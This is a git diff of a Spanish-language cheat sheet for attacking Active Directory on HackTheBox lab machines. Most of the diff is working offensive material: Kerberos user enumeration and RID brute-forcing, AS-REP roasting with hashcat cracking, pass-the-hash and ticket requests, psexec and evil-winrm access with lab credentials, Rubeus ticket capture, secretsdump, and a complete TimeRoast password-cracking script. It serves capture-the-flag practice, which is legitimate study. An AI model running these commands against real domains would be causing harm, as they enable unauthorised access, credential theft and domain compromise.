@@ -1,4 +1,9 @@
+**POR SSL WINRM
+```bash
+https://github.com/ozelis/winrmexec
 
+python evil_winrmexec.py -ssl nanocorp.htb/monitoring_svc:'SuperStrongPassword!'@dc01.nanocorp.htb -k
+```
 # Siempre lanzar
 
 ```bash
@@ -20,58 +25,34 @@ nameserver 10.10.11.45
 
 nano /etc/krb5.conf
 
-default_realm = VINTAGE.HTB
+[libdefaults]
+    default_realm = MIRAGE.HTB
+    dns_lookup_realm = false
+    dns_lookup_kdc = true
+    ticket_lifetime = 24h
+    renew_lifetime = 7d
+    forwardable = true
+
 [realms]
-        VINTAGE.HTB = {
-                kdc = 10.10.11.45 #IP DEL MAQUINA
-                kdc = kerberos-1.mit.edu
-                kdc = kerberos-2.mit.edu:88
-                admin_server = 10.10.11.45 #IP DELA MAQUINA
-                default_domain = mit.edu
-        }
+    MIRAGE.HTB = {
+        kdc = dc01.mirage.htb
+        admin_server = dc01.mirage.htb
+        default_domain = mirage.htb
+    }
 
 [domain_realm]
-        .mit.edu = ATHENA.MIT.EDU
-        mit.edu = ATHENA.MIT.EDU
-        .media.mit.edu = MEDIA-LAB.MIT.EDU
-        media.mit.edu = MEDIA-LAB.MIT.EDU
-        .csail.mit.edu = CSAIL.MIT.EDU
-        csail.mit.edu = CSAIL.MIT.EDU
-        .whoi.edu = ATHENA.MIT.EDU
-        whoi.edu = ATHENA.MIT.EDU
-        .stanford.edu = stanford.edu
-        .slac.stanford.edu = SLAC.STANFORD.EDU
-        .toronto.edu = UTORONTO.CA
-        .utoronto.ca = UTORONTO.CA
-        .vintage.htb = VINTAGE.HTB
-        vintage.htb = VINTAGE.HTB
-
-
-# SI no prueba
-
-[domain_realm] 
-.frizz.htb = FRIZZ.HTB 
-frizz.htb = FRIZZ.HTB 
-
-[libdefaults] 
-default_realm = FRIZZ.HTB 
-dns_lookup_realm = false 
-dns_lookup_kdc = true 
-ticket_lifetime = 24h 
-forwardable = true 
-
-[realms] 
-FRIZZ.HTB = { 
-	kdc = frizzdc.frizz.htb 
-	admin_server = frizzdc.frizz.htb 
-	default_domain = frizz.htb 
-}
+    .mirage.htb = MIRAGE.HTB
+    mirage.htb = MIRAGE.HTB
 ```
 
 
 - Enumerar usuarios
 ```bash
 kerbrute userenum -d DOMAIN.LOCAL --dc $IP users.txt
+
+kerbrute userenum --dc 10.10.11.91 -d hercules.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 100
+
+crackmapexec smb 10.10.11.35 -u 'null' -p '' --rid-brute
 ```
 
 - Si saca un `TGT` entonces lo crackeamos
@@ -79,17 +60,6 @@ kerbrute userenum -d DOMAIN.LOCAL --dc $IP users.txt
 hashcat --example-hashes| grep "krb5asrep" -B 11
 
 hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
-```
-
-- Compruebas la contraseña, si sale `pwned` podras acceder al sistema.
-```bash
-netexec smb 10.10.10.175 -u "fsmith" -p pass.txt
-```
-- Si el puerto 5985 esta abierto probamos a ver si sale pwned
-```bash
-netexec winrm 10.10.10.175 -u "fsmith" -p pass.txt
-
-evil-winrm -i 10.10.10.175 -u "fsmith" -p "Thestrokes23"
 ```
 
 - Kerberos WINRM
@@ -124,9 +94,10 @@ netexec smb dc01.sequel.htb -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
 ## ASREPROAST
 
 ```bash
-impacket-GetNPUsers  -no-pass -usersfile users certified.htb/
-```
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
 
+hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
+```
 
 ## Request TGS
 
@@ -134,9 +105,7 @@ impacket-GetNPUsers  -no-pass -usersfile users certified.htb/
 impacket-GetUserSPNs certified.htb/judith.mader:judith09 -request
 ```
 
-
 ## NTLM = FALSE
-
 
 - Probar con `-k
 - Debes usar el dominio
@@ -150,6 +119,8 @@ netexec smb dc01.vintage.htb -u 'p.rosa' -p 'Rosaisbest123' -k
 
 ```bash
 impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01
+
+impacket-getTGT mirage.htb/Mirage-Service\$ -hashes :305806d84f7c1be93a07aaf40f0c7866
 ```
 
 - Buscas el pc y generas el ticket
@@ -185,9 +156,129 @@ KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache netexec smb dc01.vint
 ```bash
 kdestroy
 ```
+## Conectandose por PSEXEC
 
-## Minidump
+```ruby
+impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.175 cmd.exe
+```
+
+## Pedir ticket
 
 ```bash
-pypykatz lsa minidump lsass.DMP
+impacket-getTGT mirage.htb/nathan.aadam:'3edc#EDC3' 
+export KRB5CCNAME=nathan.aadam.ccache 
 ```
+
+## Activar cuenta / WINRM
+
+```bash
+$Password = ConvertTo-SecureString "1day@atime" -AsPlainText -Force $Cred = 
+
+New-Object System.Management.Automation.PSCredential ("MIRAGE\mark.bbond" , 
+$Password) 
+
+Enable-ADAccount -Identity javier.mmarshall -Cred $Cred
+```
+
+## TimeRoast
+
+- Descargar de https://github.com/SecuraBV/Timeroast
+- Primero creo el hash
+```bash
+python3 timeroast.py 10.10.11.75 -o rustykey.hashes
+```
+
+- Los rompo y busco el rid de ese usuario
+
+```bash
+python3 timecrack.py rustykey.hashes2 /usr/share/wordlists/rockyou.txt
+```
+
+- Edite el *TIMECRACK*
+```python
+#!/usr/bin/env python3
+"""Perform a simple dictionary attack against the output of timeroast.py. Necessary because
+the NTP 'hash' format
+unfortunately does not fit into Hashcat or John right now.
+Not even remotely optimized, but still useful for cracking legacy default passwords (where
+the password is the computer
+name) or specific default passwords that are popular in an organisation.
+"""
+from binascii import hexlify, unhexlify
+from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter
+from typing import TextIO, Generator, Tuple
+import hashlib, sys, re
+
+HASH_FORMAT = r'^(?P<rid>\d+):\$sntp-ms\$(?P<hashval>[0-9a-f]{32})\$(?P<salt>[0-9a-f]{96})$'
+
+def md4(data: bytes) -> bytes:
+    try:
+        return hashlib.new('md4', data).digest()
+    except ValueError:
+        from md4 import MD4  # Fallback to pure Python if OpenSSL has no MD4
+        return MD4(data).bytes()
+
+def compute_hash(password: str, salt: bytes) -> bytes:
+    """Compute a legacy NTP authenticator 'hash'."""
+    return hashlib.md5(md4(password.encode('utf-16le')) + salt).digest()
+
+def try_crack(hashfile: TextIO, dictfile: TextIO) -> Generator[Tuple[int, str], None, None]:
+    hashes = []
+    for line in hashfile:
+        line = line.strip()
+        if line:
+            m = re.match(HASH_FORMAT, line)
+            if not m:
+                print(f'ERROR: invalid hash format: {line}', file=sys.stderr)
+                sys.exit(1)
+            rid, hashval, salt = m.group('rid', 'hashval', 'salt')
+            hashes.append((int(rid), unhexlify(hashval), unhexlify(salt)))
+    
+    for password in dictfile:
+        password = password.strip()
+        for rid, hashval, salt in hashes:
+            if compute_hash(password, salt) == hashval:
+                yield rid, password
+
+def main():
+    argparser = ArgumentParser(
+        formatter_class=RawDescriptionHelpFormatter,
+        description="""Perform a simple dictionary attack against the output of timeroast.py.
+Not even remotely optimized, but still useful for cracking legacy default
+passwords (where the password is the computer name) or specific default
+passwords that are popular in an organisation."""
+    )
+    argparser.add_argument('hashes', type=FileType('r'), help='Output of timeroast.py')
+    argparser.add_argument('dictionary', type=lambda f: open(f, encoding='latin-1'),
+                           help='Line-delimited password dictionary (e.g. rockyou.txt)')
+    args = argparser.parse_args()
+
+    crackcount = 0
+    for rid, password in try_crack(args.hashes, args.dictionary):
+        print(f'[+] Cracked RID {rid} password: {password}')
+        crackcount += 1
+    print(f'\n{crackcount} passwords recovered.')
+
+if __name__ == '__main__':
+    main()
+```
+
+## TICKETS CON RUBEUS
+
+- Modo monitor en la maquina victima:
+```bash
+rubeus.exe monitor /interval:1 /nowrap
+
+#Conectate a mssql y haz un dirtree a donde tengas el rubeus para DC01 si estas en DC02
+
+#Guardalo en tiket.kirbi
+cat tikcket.kirbi| base64 -d > ticket.kirbi
+#SI no:
+cat ticket_b64 | tr -d ' ' | tr -d '\n' | base64 -d > ticket.kirbi
+wget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/ticketConverter.py
+
+python3 ticketConverter.py ticket.kirbi ticket.ccache
+
+impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
+```
+
